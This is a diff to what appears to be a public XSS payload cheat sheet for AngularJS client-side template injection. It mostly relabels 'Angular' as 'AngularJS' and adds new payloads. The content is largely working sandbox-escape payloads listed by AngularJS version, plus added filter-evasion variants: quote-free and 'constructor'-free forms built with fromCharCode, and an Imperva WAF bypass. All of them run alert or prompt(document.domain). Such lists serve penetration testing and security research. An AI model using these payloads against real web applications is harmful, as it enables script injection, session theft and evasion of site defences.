@@ -1,20 +1,22 @@
-# XSS in Angular
+# XSS in Angular and AngularJS
 
 ## Client Side Template Injection
 
 The following payloads are based on Client Side Template Injection.
 
-### Stored/Reflected XSS - Simple alert 
+### Stored/Reflected XSS - Simple alert in AngularJS
 
-> Angular as of version 1.6 have removed the sandbox altogether
+`ng-app` directive must be present in a root element to allow the client-side injection (cf. [AngularJS: API: ngApp](https://docs.angularjs.org/api/ng/directive/ngApp)).
 
-Angular 1.6+ by [Mario Heiderich](https://twitter.com/cure53berlin)
+> AngularJS as of version 1.6 have removed the sandbox altogether
+
+AngularJS 1.6+ by [Mario Heiderich](https://twitter.com/cure53berlin)
 
 ```javascript
 {{constructor.constructor('alert(1)')()}}
 ```
 
-Angular 1.6+ by [@brutelogic](https://twitter.com/brutelogic/status/1031534746084491265)
+AngularJS 1.6+ by [@brutelogic](https://twitter.com/brutelogic/status/1031534746084491265)
 
 ```javascript
 {{[].pop.constructor&#40'alert\u00281\u0029'&#41&#40&#41}}
@@ -22,7 +24,7 @@ Angular 1.6+ by [@brutelogic](https://twitter.com/brutelogic/status/103153474608
 
 Example available at [https://brutelogic.com.br/xss.php](https://brutelogic.com.br/xss.php?a=<brute+ng-app>%7B%7B[].pop.constructor%26%2340%27alert%5Cu00281%5Cu0029%27%26%2341%26%2340%26%2341%7D%7D)
 
-Angular 1.6.0 by [@LewisArdern](https://twitter.com/LewisArdern/status/1055887619618471938) & [@garethheyes](https://twitter.com/garethheyes/status/1055884215131213830)
+AngularJS 1.6.0 by [@LewisArdern](https://twitter.com/LewisArdern/status/1055887619618471938) & [@garethheyes](https://twitter.com/garethheyes/status/1055884215131213830)
 
 ```javascript
 {{0[a='constructor'][a]('alert(1)')()}}
@@ -30,7 +32,7 @@ Angular 1.6.0 by [@LewisArdern](https://twitter.com/LewisArdern/status/105588761
 {{$on.constructor('alert(1)')()}}
 ```
 
-Angular 1.5.9 - 1.5.11 by [Jan Horn](https://twitter.com/tehjh)
+AngularJS 1.5.9 - 1.5.11 by [Jan Horn](https://twitter.com/tehjh)
 
 ```javascript
 {{
@@ -49,25 +51,25 @@ Angular 1.5.9 - 1.5.11 by [Jan Horn](https://twitter.com/tehjh)
 }}
 ```
 
-Angular 1.5.0 - 1.5.8
+AngularJS 1.5.0 - 1.5.8
 
 ```javascript
 {{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}
 ```
 
-Angular 1.4.0 - 1.4.9
+AngularJS 1.4.0 - 1.4.9
 
 ```javascript
 {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
 ```
 
-Angular 1.3.20
+AngularJS 1.3.20
 
 ```javascript
 {{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
 ```
 
-Angular 1.3.19
+AngularJS 1.3.19
 
 ```javascript
 {{
@@ -76,7 +78,7 @@ Angular 1.3.19
 }}
 ```
 
-Angular 1.3.3 - 1.3.18
+AngularJS 1.3.3 - 1.3.18
 
 ```javascript
 {{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;
@@ -84,7 +86,7 @@ Angular 1.3.3 - 1.3.18
   $eval('x=alert(1)//');  }}
 ```
 
-Angular 1.3.1 - 1.3.2
+AngularJS 1.3.1 - 1.3.2
 
 ```javascript
 {{
@@ -94,7 +96,7 @@ Angular 1.3.1 - 1.3.2
 }}
 ```
 
-Angular 1.3.0
+AngularJS 1.3.0
 
 ```javascript
 {{!ready && (ready = true) && (
@@ -113,42 +115,73 @@ Angular 1.3.0
     );}}
 ```
 
-Angular 1.2.24 - 1.2.29
+AngularJS 1.2.24 - 1.2.29
 
 ```javascript
 {{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}
 ```
 
-Angular 1.2.19 - 1.2.23
+AngularJS 1.2.19 - 1.2.23
 
 ```javascript
 {{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}
 ```
 
-Angular 1.2.6 - 1.2.18
+AngularJS 1.2.6 - 1.2.18
 
 ```javascript
 {{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}
 ```
 
-Angular 1.2.2 - 1.2.5
+AngularJS 1.2.2 - 1.2.5
 
 ```javascript
 {{'a'[{toString:[].join,length:1,0:'__proto__'}].charAt=''.valueOf;$eval("x='"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+"'");}}
 ```
 
-Angular 1.2.0 - 1.2.1
+AngularJS 1.2.0 - 1.2.1
 
 ```javascript
 {{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
 ```
 
-Angular 1.0.1 - 1.1.5 and Vue JS
+AngularJS 1.0.1 - 1.1.5 and Vue JS
 
 ```javascript
 {{constructor.constructor('alert(1)')()}}
 ```
 
+### Advanced bypassing XSS
+
+AngularJS (without `'` single and `"` double quotes) by [@Viren](https://twitter.com/VirenPawar_)
+
+```javascript
+{{x=valueOf.name.constructor.fromCharCode;constructor.constructor(x(97,108,101,114,116,40,49,41))()}}
+```
+
+AngularJS (without `'` single and `"` double quotes and `constructor` string)
+
+```javascript
+{{x=767015343;y=50986827;a=x.toString(36)+y.toString(36);b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,toString()[a].fromCharCode(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}}
+```
+
+```javascript
+{{x=767015343;y=50986827;a=x.toString(36)+y.toString(36);b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,toString()[a].fromCodePoint(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}}
+```
+
+```javascript
+{{x=767015343;y=50986827;a=x.toString(36)+y.toString(36);a.sub.call.call({}[a].getOwnPropertyDescriptor(a.sub.__proto__,a).value,0,toString()[a].fromCharCode(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}}
+```
+
+```javascript
+{{x=767015343;y=50986827;a=x.toString(36)+y.toString(36);a.sub.call.call({}[a].getOwnPropertyDescriptor(a.sub.__proto__,a).value,0,toString()[a].fromCodePoint(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}}
+```
+
+AngularJS bypass Waf [Imperva]
+
+```javascript
+{{x=['constr', 'uctor'];a=x.join('');b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'pr\\u{6f}mpt(d\\u{6f}cument.d\\u{6f}main)')()}}
+```
 
 ### Blind XSS
 
@@ -299,3 +332,4 @@ When doing a code review, you want to make sure that no user input is being trus
 - [Blind XSS AngularJS Payloads](https://ardern.io/2018/12/07/angularjs-bxss)
 - [Angular Security](https://angular.io/guide/security)
 - [Bypass DomSanitizer](https://medium.com/@swarnakishore/angular-safe-pipe-implementation-to-bypass-domsanitizer-stripping-out-content-c1bf0f1cc36b)
+- [Bidding Like a Billionaire - Stealing NFTs With 4-Char CSTIs - Matan Berson - 2024-07-11](https://matanber.com/blog/4-char-csti)
